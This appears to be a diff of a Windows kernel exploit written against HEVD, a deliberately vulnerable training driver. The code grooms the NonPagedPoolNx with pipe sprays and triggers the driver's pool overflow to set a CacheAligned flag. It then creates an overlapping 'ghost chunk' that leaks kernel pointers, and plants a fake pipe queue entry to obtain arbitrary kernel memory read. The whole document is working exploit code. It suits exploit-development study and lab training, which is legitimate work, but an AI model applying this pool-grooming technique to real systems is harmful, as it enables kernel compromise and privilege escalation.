@@ -10,172 +10,166 @@
 
 pipe_queue_entry_sub_t g_fake_pipe_queue_sub;
 
-int scanPipesForLeak(pipe_spray_t* pipe_spray, vs_chunk_t* leaked_ghost_vs_chunk)
-{
-    for (size_t i = 0; i < pipe_spray->nb; i++)
-    {
-        char scan_buf[0x1000] = { 0 };
-
-        if (!PeekDataFromPipe(&pipe_spray->pipes[i], scan_buf, sizeof(vs_chunk_t)))
-        {
-            fprintf(stderr, "[-] Failed to peek pipe\n");
-            exit(0);
-        }
-
-        if (memcmp((char*)pipe_spray->data_buf, scan_buf, sizeof(vs_chunk_t)))
-        {
-            printf("[+] Detected pipe with overwritten buffer\n");
-
-            printf("\toriginal:    ");
-            for (int j = 0; j < sizeof(vs_chunk_t); j++)
-            {
-                printf("%02x ", pipe_spray->data_buf[j] & 0xff);
-            }
-            puts("");
-            printf("\toverwritten: ");
-            for (int j = 0; j < sizeof(vs_chunk_t); j++)
-            {
-                printf("%02x ", scan_buf[j] & 0xff);
-            }
-            puts("");
-
-            memcpy(leaked_ghost_vs_chunk, scan_buf, sizeof(vs_chunk_t));
-            return i;
-        }
-    }
-    return -1;
-}
-
-lookaside_t* prepareLookaside(size_t size)
-{
-    if (size < ATTRIBUTE_NAME_LEN) {
-        return NULL;
-    }
-
-    lookaside_t* lookaside = (lookaside_t*)malloc(sizeof(lookaside_t));
-    if (!lookaside) {
-        return NULL;
-    }
-
-    lookaside->size = size;
-    lookaside->buf = (char*)malloc(lookaside->size);
-    if (!lookaside->buf) {
-        return NULL;
-    }
-
-    memset(lookaside->buf, 0x40, lookaside->size);
-    strcpy_s(lookaside->buf, ATTRIBUTE_NAME_LEN, ATTRIBUTE_NAME);
-
-    lookaside->first = CreatePipeSpray(0x10000, lookaside->size, lookaside->buf);
-    lookaside->second = CreatePipeSpray(0x10000, lookaside->size, lookaside->buf);
-    lookaside->drain = CreatePipeSpray(0x100, lookaside->size, lookaside->buf);
-
-    return lookaside;
-}
-
-int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+void allocateNewVsSubSegment()
 {
     char dummy_attribute[0x1000];
     memset(dummy_attribute, 0x41, 0x1000);
 
-    puts("[*] Spraying pipes to allocate new VS_SUB_SEGMENT...");
-    pipe_spray_t* drain_spray = CreatePipeSpray(0x20000, TARGETED_VULN_SIZE, dummy_attribute);
-    PerformPipeSpray(drain_spray);
+    SprayNPPNxChunks(0x20000, (vs_chunk_t*)dummy_attribute, VULN_BLOCK_SIZE);
+}
 
-    puts("[*] Spraying pipes to create chunk holes...");
-    pipe_spray_t* create_holes_spray = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE + 0x10, dummy_attribute);
-    PerformPipeSpray(create_holes_spray);
+pipe_group_t* createChunkHoles()
+{
+    char dummy_attribute[0x1000];
+    memset(dummy_attribute, 0x41, 0x1000);
 
-    Sleep(500);
+    pipe_group_t* victim_chunks = SprayNPPNxChunks(SPRAY_SIZE, (vs_chunk_t*)dummy_attribute, VICTIM_BLOCK_SIZE);
 
     // Create holes
-    FreeEveryThirdPipe(create_holes_spray, 0);
+    for (size_t i = 0; i < victim_chunks->nb; i += 3)
+    {
+        FreeNPPNxChunk(victim_chunks->pipes[i], VICTIM_BLOCK_SIZE);
+        victim_chunks->pipes[i] = { 0 };
+    }
 
-    // Trigger vulnerability to manipulate adjacent chunk's pool header
+    return victim_chunks;
+}
+
+void setCacheAlignedFlagOnVictimChunk()
+{
     vs_chunk_t overflow_chunk = { 0 };
-    overflow_chunk.pool_header.PreviousSize = TARGETED_VULN_BUFSIZE / 0x10;
+    overflow_chunk.pool_header.PreviousSize = PIPE_QUEUE_ENTRY_BUFSIZE(VICTIM_BLOCK_SIZE) / 0x10;
     overflow_chunk.pool_header.PoolIndex = 0;
     overflow_chunk.pool_header.BlockSize = 0;
-    overflow_chunk.pool_header.PoolType = 0 | 4; // set aligned chunk flag
+    overflow_chunk.pool_header.PoolType = 0 | 4; // Set CacheAligned flag
 
     HANDLE hHevd = HevdOpenDeviceHandle();
     HevdTriggerBufferOverflowNonPagedPoolNx(hHevd, (char*)&overflow_chunk);
     CloseHandle(hHevd);
 
     Sleep(2000);
-
-    vs_chunk_t fake_pool_header_chunk = { 0 };
-    fake_pool_header_chunk.pool_header.PreviousSize = 0;
-    fake_pool_header_chunk.pool_header.PoolIndex = 0;
-    fake_pool_header_chunk.pool_header.BlockSize = (GHOST_CHUNK_SIZE + sizeof(POOL_HEADER)) / 0x10;
-    fake_pool_header_chunk.pool_header.PoolTag = 0x4141414141;
-
-    puts("[*] Spraying pipes with fake POOL_HEADER...");
-    pipes->fake_pool_header = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, (char*)&fake_pool_header_chunk);
-    PerformPipeSpray(pipes->fake_pool_header);
-
-    lookaside_t* ghost_lookaside = prepareLookaside(GHOST_CHUNK_SIZE + 0x10);
-    lookaside_t* vuln_lookaside = prepareLookaside(TARGETED_VULN_SIZE + 0x10);
-    EnableLookaside(2, ghost_lookaside, vuln_lookaside);
-
-    puts("[+] Locating overwritten chunk...");
-    memset(dummy_attribute, 0x43, 0x1000);
-    strcpy_s(dummy_attribute, ATTRIBUTE_NAME_LEN, ATTRIBUTE_NAME);
-    size_t leaking_pipe_idx = -1;
-    pipe_spray_t* ghosts = CreatePipeSpray(SPRAY_SIZE, GHOST_CHUNK_SIZE + 0x10, dummy_attribute);
-
-    for (int ghost_idx = 0; ghost_idx < create_holes_spray->nb; ghost_idx++)
-    {
-        // Free an existing pipe queue entry to create space for the ghost chunk
-        FreeNPPNxChunk(&create_holes_spray->pipes[ghost_idx], create_holes_spray->bufsize);
-        // Allocate a chunk of ghost chunk size and attempt to secure the created ghost chunk
-        AllocNPPNxChunk(&ghosts->pipes[ghost_idx], (vs_chunk_t*)dummy_attribute, GHOST_CHUNK_BUFSIZE);
-
-        // Check if ghost chunk creation and allocation was successful
-        vs_chunk_t leaked_ghost_vs_chunk;
-        leaking_pipe_idx = scanPipesForLeak(pipes->fake_pool_header, &leaked_ghost_vs_chunk);
-        if (leaking_pipe_idx == -1)
-        {
-            // If ghost chunk creation failed, clear the lookaside list head and retry
-            AllocNPPNxChunk(&create_holes_spray->pipes[ghost_idx], (vs_chunk_t*)create_holes_spray->data_buf, create_holes_spray->bufsize);
-            continue;
-        }
-        else
-        {
-            printf("[+] Data leak detected in pipe %lld (fake_pool_header)\n", leaking_pipe_idx);
-
-            addrs->root_pipe_queue_entry = (uintptr_t)leaked_ghost_vs_chunk.pipe_queue_entry.list.Flink;
-            printf("[+] leak_root_queue: 0x%llX\n", addrs->root_pipe_queue_entry);
-
-            addrs->root_pipe_attribute = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + ROOT_PIPE_ATTRIBUTE_OFFSET;
-            printf("[+] leak_root_attribute: 0x%llX\n", addrs->root_pipe_attribute);
-
-            pipes->ghost_pipe = &ghosts->pipes[ghost_idx];
-            printf("[+] ghost_pipe: 0x%p\n", pipes->ghost_pipe);
-
-            pipes->previous_pipe = &pipes->fake_pool_header->pipes[leaking_pipe_idx];
-            printf("[+] previous_pipe: 0x%p\n", pipes->previous_pipe);
-            break;
-        }
-    }
-
-    if (leaking_pipe_idx == -1)
-    {
-        fprintf(stderr, "[-] Failed to detect data leak in pipes\n");
-        return 0;
-    }
-
-    return 1;
 }
 
-int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+void enableLookaside(int count, ...)
 {
-    if (!createGhostChunk(pipes, addrs))
+    va_list ap;
+
+    va_start(ap, count);
+    for (int i = 0; i < count; i++)
     {
-        fprintf(stderr, "[-] Failed to create ghost chunk\n");
-        return 0;
+        size_t block_size = va_arg(ap, size_t);
+        SprayNPPNxChunks(0x10000, NULL, block_size);
+    }
+    va_end(ap);
+
+    Sleep(2000);
+
+    va_start(ap, count);
+    for (int i = 0; i < count; i++)
+    {
+        size_t block_size = va_arg(ap, size_t);
+        SprayNPPNxChunks(0x10000, NULL, block_size);
+    }
+    va_end(ap);
+
+    Sleep(1000);
+
+    va_start(ap, count);
+    for (int i = 0; i < count; i++)
+    {
+        size_t block_size = va_arg(ap, size_t);
+        SprayNPPNxChunks(0x100, NULL, block_size);
+        printf("[+] Size 0x%llX enabled\n", block_size);
+    }
+    va_end(ap);
+}
+
+void printHexDump(char* data, size_t size)
+{
+    for (size_t j = 0; j < size; j++)
+    {
+        printf("%02x ", data[j] & 0xff);
+    }
+    puts("");
+}
+
+size_t scanPipesForGhostChunkLeak(pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk, vs_chunk_t* leaked_ghost_chunk)
+{
+    for (size_t i = 0; i < fake_pool_header_chunks->nb; i++)
+    {
+        char scan_buf[0x1000] = { 0 };
+
+        if (!PeekDataFromPipe(&fake_pool_header_chunks->pipes[i], scan_buf, sizeof(vs_chunk_t)))
+        {
+            fprintf(stderr, "[-] Failed to peek pipe for overlap detection\n");
+            exit(0);
+        }
+
+        if (memcmp((char*)fake_vs_chunk, scan_buf, sizeof(vs_chunk_t)))
+        {
+            printf("[+] Chunk overlap detected in pipe %lld\n", i);
+
+            printf("\tOriginal data:     ");
+            printHexDump((char*)fake_vs_chunk, sizeof(vs_chunk_t));
+
+            printf("\tLeaked ghost data: ");
+            printHexDump(scan_buf, sizeof(vs_chunk_t));
+
+            memcpy(leaked_ghost_chunk, scan_buf, sizeof(vs_chunk_t));
+            return i;
+        }
+    }
+    return -1;
+}
+
+int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_group_t* victim_chunks, pipe_group_t* fake_pool_header_chunks, vs_chunk_t* fake_vs_chunk)
+{
+    pipe_group_t* ghost_chunk_candidates = CreatePipeGroup(SPRAY_SIZE, GHOST_BLOCK_SIZE);
+
+    for (int ghost_chunk_idx = 0; ghost_chunk_idx < victim_chunks->nb; ghost_chunk_idx++)
+    {
+        // Free a cache aligned victim chunk to create space for the ghost chunk
+        FreeNPPNxChunk(victim_chunks->pipes[ghost_chunk_idx], VICTIM_BLOCK_SIZE);
+
+        // Allocate a ghost chunk, potentially occupying the freed cached aligned space
+        ghost_chunk_candidates->pipes[ghost_chunk_idx] = AllocNPPNxChunk(NULL, GHOST_BLOCK_SIZE);
+
+        // Check if ghost chunk creation and allocation was successful by detecting information leak
+        vs_chunk_t leaked_ghost_chunk_data;
+        size_t previous_chunk_idx = scanPipesForGhostChunkLeak(fake_pool_header_chunks, fake_vs_chunk, &leaked_ghost_chunk_data);
+        if (previous_chunk_idx != -1)
+        {
+            printf("[+] Detected information leak from overlapping chunks in pipe %lld (fake_pool_header)\n", previous_chunk_idx);
+
+            addrs->root_pipe_queue_entry = (uintptr_t)leaked_ghost_chunk_data.pipe_queue_entry.list.Flink;
+            printf("[+] root_pipe_queue_entry: 0x%llX\n", addrs->root_pipe_queue_entry);
+
+            addrs->root_pipe_attribute = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + ROOT_PIPE_ATTRIBUTE_OFFSET;
+            printf("[+] root_pipe_attribute: 0x%llX\n", addrs->root_pipe_attribute);
+
+            pipes->ghost_chunk_pipe = ghost_chunk_candidates->pipes[ghost_chunk_idx];
+            printf("[+] ghost_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->ghost_chunk_pipe.read, pipes->ghost_chunk_pipe.write);
+            ghost_chunk_candidates->pipes[ghost_chunk_idx] = { 0 };
+            DestroyPipeGroup(ghost_chunk_candidates);
+
+            pipes->previous_chunk_pipe = fake_pool_header_chunks->pipes[previous_chunk_idx];
+            printf("[+] previous_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->previous_chunk_pipe.read, pipes->previous_chunk_pipe.write);
+            fake_pool_header_chunks->pipes[previous_chunk_idx] = { 0 };
+            DestroyPipeGroup(fake_pool_header_chunks);
+
+            return 1;
+        }
+
+        // If ghost chunk creation failed, clear the lookaside list head and retry
+        victim_chunks->pipes[ghost_chunk_idx] = AllocNPPNxChunk(NULL, VICTIM_BLOCK_SIZE);
     }
 
+    fprintf(stderr, "[-] Failed to create ghost chunk: No information leak detected\n");
+    return 0;
+}
+
+void setFakePipeQueueEntry(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+{
     vs_chunk_t fake_pipe_queue_entry_chunk = { 0 };
     fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
     fake_pipe_queue_entry_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
@@ -186,14 +180,47 @@ int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
     fake_pipe_queue_entry_chunk.pipe_queue_entry.remaining_bytes = 0xffffffff;
     fake_pipe_queue_entry_chunk.pipe_queue_entry.field_2C = 0x43434343;
 
-    puts("[*] Spraying pipes with fake pipe queue entry...");
     uintptr_t pipe_queue_entry_addr;
     do
     {
-        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
-        AllocNPPNxChunk(pipes->previous_pipe, &fake_pipe_queue_entry_chunk, TARGETED_VULN_SIZE - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t));
-        ArbitraryRead(pipes->ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    } while (pipe_queue_entry_addr == 0x434343434343005A);
+        FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
+        pipes->previous_chunk_pipe = AllocNPPNxChunk(&fake_pipe_queue_entry_chunk, VULN_BLOCK_SIZE);
+        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
+    } while (pipe_queue_entry_addr == 0x4141414141414141);
+}
+
+int SetupArbitraryRead(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
+{
+    puts("[*] Allocating new VS_SUB_SEGMENT...");
+    allocateNewVsSubSegment();
+
+    puts("[*] Creating chunk holes...");
+    pipe_group_t* victim_chunks = createChunkHoles();
+
+    puts("[*] Exploiting HEVD to set CacheAligned flag...");
+    setCacheAlignedFlagOnVictimChunk();
+
+    puts("[*] Placing fake POOL_HEADERs for cache alignment...");
+    vs_chunk_t fake_vs_chunk = { 0 };
+    fake_vs_chunk.pool_header.PreviousSize = 0;
+    fake_vs_chunk.pool_header.PoolIndex = 0;
+    fake_vs_chunk.pool_header.BlockSize = GHOST_BLOCK_SIZE / 0x10;
+    fake_vs_chunk.pool_header.PoolTag = 0x4141414141;
+
+    pipe_group_t* fake_pool_header_chunks = SprayNPPNxChunks(SPRAY_SIZE, &fake_vs_chunk, VULN_BLOCK_SIZE);
+
+    puts("[*] Enabling dynamic lookaside lists...");
+    enableLookaside(2, GHOST_BLOCK_SIZE, VICTIM_BLOCK_SIZE);
+
+    puts("[*] Creating and locating ghost chunk...");
+    if (!createGhostChunk(pipes, addrs, victim_chunks, fake_pool_header_chunks, &fake_vs_chunk))
+    {
+        fprintf(stderr, "[-] Failed to create ghost chunk\n");
+        return 0;
+    }
+
+    puts("[*] Spraying pipes with fake pipe queue entry...");
+    setFakePipeQueueEntry(pipes, addrs);
 
     return 1;
 }
